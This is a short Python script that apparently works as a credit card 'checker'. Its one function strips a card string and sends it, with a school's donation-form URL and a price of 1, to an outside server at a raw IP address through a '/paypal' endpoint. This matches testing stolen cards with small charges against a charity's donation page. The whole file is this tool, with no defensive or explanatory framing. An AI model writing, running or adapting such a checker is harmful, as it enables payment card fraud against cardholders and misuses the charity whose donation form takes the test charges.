import requests
def chkk(ccx):
	cc=ccx.strip()
	urll="https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1"
	price="1"
	res=requests.get(f'http://151.247.197.54:5500/paypal?cc={cc}&url={urll}&price={price}').text
	return res
